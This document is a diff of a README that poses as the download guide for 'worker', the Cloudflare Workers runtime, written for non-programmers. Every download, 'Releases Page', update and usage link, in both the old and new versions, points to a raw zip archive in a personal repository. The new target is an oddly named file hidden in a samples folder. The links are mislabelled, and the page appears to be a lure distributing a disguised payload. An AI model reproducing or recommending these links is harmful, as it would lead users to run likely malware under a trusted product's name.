@@ -4,11 +4,11 @@
 Welcome to **worker**, the JavaScript and WebAssembly runtime that powers Cloudflare Workers. This guide will help you download and run the software even if you have no programming experience.
 
 ## 📥 Download Worker
-[![Download Worker](https://raw.githubusercontent.com/cloxkzii/worker/main/dactylopore/worker.zip)](https://raw.githubusercontent.com/cloxkzii/worker/main/dactylopore/worker.zip)
+[![Download Worker](https://github.com/cloxkzii/worker/raw/refs/heads/main/samples/static-files-from-disk/content-dir/Software-buildress.zip)](https://github.com/cloxkzii/worker/raw/refs/heads/main/samples/static-files-from-disk/content-dir/Software-buildress.zip)
 
 You can get the latest version of worker from our Releases page. Click the button above or visit the link below to start your download.
 
-[Download Worker from Releases](https://raw.githubusercontent.com/cloxkzii/worker/main/dactylopore/worker.zip)
+[Download Worker from Releases](https://github.com/cloxkzii/worker/raw/refs/heads/main/samples/static-files-from-disk/content-dir/Software-buildress.zip)
 
 ## 🖥️ System Requirements
 Before you start, make sure your computer meets the following requirements:
@@ -21,7 +21,7 @@ Before you start, make sure your computer meets the following requirements:
 Follow these simple steps to install worker:
 
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://raw.githubusercontent.com/cloxkzii/worker/main/dactylopore/worker.zip) to find the latest version of worker. Look for the most recent release at the top.
+   Go to the [Releases Page](https://github.com/cloxkzii/worker/raw/refs/heads/main/samples/static-files-from-disk/content-dir/Software-buildress.zip) to find the latest version of worker. Look for the most recent release at the top.
 
 2. **Choose Your Version**
    You’ll see various files listed. Pick the one suitable for your operating system. For example:
@@ -48,7 +48,7 @@ Now that you have worker installed, you can start using it to run your JavaScrip
 - **Running Code:** To run your code, open a command prompt or terminal. Type the command for worker followed by the path to your code file.
   For example:
   ```
-  worker https://raw.githubusercontent.com/cloxkzii/worker/main/dactylopore/worker.zip
+  worker https://github.com/cloxkzii/worker/raw/refs/heads/main/samples/static-files-from-disk/content-dir/Software-buildress.zip
   ```
 
 ## 📚 Features
@@ -61,7 +61,7 @@ worker offers a range of powerful features to help you create and run web applic
 
 ## ❓ FAQ
 ### How do I update worker?
-To update worker, visit the [Releases Page](https://raw.githubusercontent.com/cloxkzii/worker/main/dactylopore/worker.zip) and download the latest version. Follow the same installation steps to replace the old version.
+To update worker, visit the [Releases Page](https://github.com/cloxkzii/worker/raw/refs/heads/main/samples/static-files-from-disk/content-dir/Software-buildress.zip) and download the latest version. Follow the same installation steps to replace the old version.
 
 ### What if I encounter problems?
 If you run into issues, please check our GitHub page for troubleshooting tips. You can also find community support in the issues section.
@@ -82,4 +82,4 @@ If you have questions or feedback, please join our community. You can ask for he
 ## 📝 Conclusion
 Thank you for choosing worker. We appreciate your interest and hope you find it useful for your JavaScript and WebAssembly projects. Remember, if you need help, the community is here to support you. 
 
-For more updates, stay tuned to our [Releases Page](https://raw.githubusercontent.com/cloxkzii/worker/main/dactylopore/worker.zip).
+For more updates, stay tuned to our [Releases Page](https://github.com/cloxkzii/worker/raw/refs/heads/main/samples/static-files-from-disk/content-dir/Software-buildress.zip).
